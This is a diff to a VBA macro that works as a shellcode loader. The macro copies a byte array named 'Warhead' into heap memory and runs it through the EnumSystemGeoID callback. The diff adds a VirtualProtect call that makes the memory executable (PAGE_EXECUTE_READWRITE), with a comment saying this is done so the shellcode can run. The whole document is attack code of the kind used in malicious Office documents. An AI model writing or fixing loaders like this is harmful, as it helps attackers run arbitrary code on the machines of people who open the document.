@@ -5,6 +5,7 @@ Private Declare PtrSafe Function EnumSystemGeoID Lib "kernel32" (ByVal GeoClass 
 Private Declare PtrSafe Sub RtlMoveMemory Lib "kernel32" (ByVal Destination As LongPtr, ByRef Source As Any, ByVal Length As Long)
 Private Declare PtrSafe Function FlsAlloc Lib "kernel32" (ByVal lpCallback As LongPtr) As Long
 Private Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As LongPtr)
+Private Declare PtrSafe Function VirtualProtect Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flNewProtect As Long, ByRef lpflOldProtect As Long) As Long
 
 Function MyMacro()
     Dim heapHandle As LongPtr
@@ -57,6 +58,10 @@ Function MyMacro()
         data = Warhead(counter)
         RtlMoveMemory ByVal Address + counter, data, 1
     Next counter
+    
+    ' Mark the heap memory executable before using it as the EnumSystemGeoID callback
+    Dim oldProtect As Long
+    Call VirtualProtect(Address, UBound(Warhead) + 1, &H40, oldProtect)  ' PAGE_EXECUTE_READWRITE
     
     ' Execute the shellcode
     Call EnumSystemGeoID(0, 0, Address)
